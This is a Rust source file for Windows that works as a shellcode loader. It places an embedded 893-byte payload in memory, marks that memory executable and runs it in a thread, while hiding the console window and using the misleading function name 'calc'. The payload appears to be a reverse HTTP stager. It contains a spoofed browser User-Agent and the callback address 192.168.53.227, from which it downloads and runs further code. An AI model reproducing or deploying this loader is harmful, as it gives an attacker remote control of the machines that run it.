#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use windows_sys::Win32::System::Memory::{
    VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, VirtualProtect, PAGE_EXECUTE
};
use windows_sys::Win32::System::Threading::{ CreateThread, WaitForSingleObject };
use windows_sys::Win32::System::WindowsProgramming::INFINITE;
// use core::time;
// use std::thread::sleep;
use std::{ptr::null_mut, ffi::c_void, mem::transmute};

fn main() {
    calc();
}

fn calc() {
    unsafe {
        let shellcode : [u8;893] = [
            0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x72, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4f, 0xff, 0xff, 0xff, 0x5d, 0x6a, 0x00, 0x49, 0xbe, 0x77, 0x69, 0x6e, 0x69, 0x6e, 0x65, 0x74, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x48, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x41, 0x50, 0x41, 0x50, 0x41, 0xba, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xeb, 0x73, 0x5a, 0x48, 0x89, 0xc1, 0x41, 0xb8, 0x5c, 0x11, 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x59, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x02, 0x40, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xd3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0xa2, 0xff, 0xff, 0xff, 0x2f, 0x47, 0x6c, 0x75, 0x35, 0x00, 0xdf, 0xfc, 0x81, 0xdc, 0xed, 0x80, 0xc5, 0x80, 0x53, 0x94, 0xc8, 0xcf, 0xfc, 0x5e, 0x34, 0x8e, 0xc0, 0x9b, 0x3f, 0xdb, 0x45, 0xf3, 0x4d, 0x14, 0x00, 0xfc, 0xd6, 0x97, 0xbd, 0x1b, 0x6e, 0xac, 0x59, 0x02, 0x94, 0xe3, 0x98, 0xfb, 0xbc, 0x10, 0x96, 0x6d, 0xa7, 0x13, 0xcd, 0x9d, 0x76, 0xa7, 0x4c, 0xbc, 0xe1, 0x9d, 0xd9, 0x1b, 0x73, 0x34, 0x92, 0x70, 0x6d, 0x9c, 0xfb, 0x6a, 0xa2, 0x73, 0x1e, 0x6a, 0xca, 0xe3, 0x0e, 0xc8, 0x54, 0x19, 0x88, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x3b, 0x20, 0x42, 0x4f, 0x49, 0x45, 0x39, 0x3b, 0x45, 0x4e, 0x49, 0x4e, 0x29, 0x0d, 0x0a, 0x00, 0xc4, 0x77, 0x4c, 0x48, 0xa4, 0x2d, 0x42, 0xe2, 0x0f, 0x4b, 0x66, 0x23, 0xee, 0xf0, 0xa1, 0x35, 0x35, 0xb7, 0x6b, 0xf0, 0x2d, 0xee, 0xd7, 0xfb, 0xdc, 0x0e, 0x1f, 0x07, 0x22, 0xd0, 0xc2, 0x5a, 0x80, 0xa9, 0x7d, 0x8b, 0x51, 0x05, 0x1c, 0xbf, 0xe1, 0x4f, 0xc8, 0x65, 0x00, 0x8e, 0x13, 0x08, 0xb0, 0xd3, 0x9f, 0xe8, 0x45, 0xaf, 0xd1, 0x49, 0x25, 0xc1, 0xfa, 0x87, 0xb8, 0x59, 0xf0, 0x24, 0xde, 0xe6, 0x94, 0x0f, 0xb1, 0xab, 0xfc, 0xa9, 0xb6, 0xf9, 0xbc, 0xe0, 0x40, 0x89, 0x01, 0x87, 0xeb, 0x2f, 0x99, 0xac, 0x39, 0x04, 0x8f, 0x4b, 0x97, 0x37, 0x51, 0x43, 0xd6, 0xc0, 0x91, 0xde, 0xbe, 0x98, 0x6d, 0x86, 0x65, 0xb6, 0x7c, 0x5c, 0xea, 0xcd, 0x41, 0xe8, 0xd4, 0x7c, 0xba, 0xeb, 0x6e, 0xa0, 0xc7, 0x79, 0x7d, 0x3a, 0x08, 0x90, 0x13, 0x36, 0xd1, 0x62, 0x07, 0xa6, 0x50, 0xba, 0xd2, 0x62, 0x6d, 0x5b, 0x85, 0xe4, 0xb3, 0x66, 0x20, 0xd8, 0xce, 0xe4, 0x15, 0x51, 0x71, 0x53, 0xa2, 0x5e, 0x65, 0x9a, 0x18, 0x06, 0xe7, 0x7e, 0x71, 0xe1, 0x8c, 0xc0, 0x92, 0x59, 0x8f, 0x35, 0xe1, 0xc4, 0xb0, 0x2e, 0x9c, 0x7a, 0xf2, 0xe8, 0xaa, 0x6f, 0x44, 0x44, 0x75, 0xe8, 0x65, 0x6c, 0x06, 0xcf, 0x57, 0x62, 0x50, 0x37, 0x41, 0x49, 0x21, 0x29, 0x78, 0x96, 0x42, 0xd8, 0x07, 0xc4, 0x49, 0xa0, 0x61, 0xe2, 0x5b, 0xe4, 0xb7, 0x5d, 0x23, 0x59, 0xc6, 0xfc, 0xf9, 0x10, 0xc0, 0xb8, 0xda, 0xe3, 0xd3, 0x4e, 0x34, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x9f, 0xfd, 0xff, 0xff, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x35, 0x33, 0x2e, 0x32, 0x32, 0x37, 0x00, 0x00, 0x01, 0x86, 0xa0
        ];
        
        let shellcode_length: usize = shellcode.len();

        let sc_mem_addr: *mut c_void = VirtualAlloc(null_mut(), shellcode_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        std::ptr::copy(shellcode.as_ptr() as _, sc_mem_addr, shellcode_length);

        let mut old_protect: u32 = PAGE_READWRITE;

        let _ = VirtualProtect(sc_mem_addr, shellcode_length, PAGE_EXECUTE, &mut old_protect);

        let mut tid = 0;
        let exec: extern "system" fn(*mut c_void) -> u32 = transmute(sc_mem_addr);
        
        let h_thread:isize = CreateThread(null_mut(), 0, Some(exec), null_mut(), 0, &mut tid);

        let _ = WaitForSingleObject(h_thread, INFINITE);
    }
}